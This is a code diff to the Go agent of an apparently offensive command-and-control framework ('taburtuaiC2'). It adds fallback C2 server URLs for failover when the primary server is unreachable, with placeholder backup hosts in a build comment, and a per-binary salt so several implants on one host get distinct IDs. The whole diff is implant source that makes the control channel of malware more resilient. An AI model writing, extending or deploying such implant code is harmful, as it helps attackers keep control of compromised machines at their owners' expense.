@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"strings"
 
 	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
 	"github.com/mjopsec/taburtuaiC2/pkg/strenc"
@@ -61,6 +62,14 @@ var (
 	// Certificate pinning — SHA-256 hex fingerprint of server TLS leaf cert.
 	defaultCertPin = ""
 
+	// Fallback C2 URLs — comma-separated list tried in order when the primary
+	// serverURL is unreachable.  Empty = no failover.
+	defaultFallbackURLs = "" // -X main.defaultFallbackURLs=https://backup1.example.com,https://backup2.example.com
+
+	// instanceSalt is a per-generated-binary random hex string so two implants
+	// deployed on the same host receive distinct UUIDs.
+	instanceSalt = "" // -X main.instanceSalt=<random 16-char hex>  — set by generator
+
 	// Debug mode — set to "true" only for development builds
 	debugMode = "false"
 )
@@ -113,8 +122,18 @@ func main() {
 	workStart, _ := strconv.Atoi(defaultWorkingHoursStart)
 	workEnd, _ := strconv.Atoi(defaultWorkingHoursEnd)
 
+	// Parse fallback URLs
+	var fallbackURLs []string
+	for _, u := range strings.Split(defaultFallbackURLs, ",") {
+		u = strings.TrimSpace(u)
+		if u != "" && u != serverURL {
+			fallbackURLs = append(fallbackURLs, u)
+		}
+	}
+
 	cfg := &AgentConfig{
 		ServerURL:         serverURL,
+		FallbackURLs:      fallbackURLs,
 		PrimaryKey:        encKey,
 		SecondaryKey:      secondaryKey,
 		Interval:          interval,
@@ -165,18 +184,21 @@ func pauseIfDebug() {
 	}
 }
 
-// generateUUID returns a stable v4-format UUID derived from host properties.
+// generateUUID returns a stable v4-format UUID.
+// instanceSalt (baked in at build time) ensures two different implant binaries
+// on the same host produce distinct IDs without requiring persistent storage.
 func generateUUID() string {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USERNAME")
 	if username == "" {
 		username = os.Getenv("USER")
 	}
-	seed := hostname + "|" + username + "|" + serverURL
+	seed := hostname + "|" + username + "|" + serverURL + "|" + instanceSalt
 	h := sha256.Sum256([]byte(seed))
 	b := h[:16]
 	b[6] = (b[6] & 0x0f) | 0x40
 	b[8] = (b[8] & 0x3f) | 0x80
 	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }
+
 
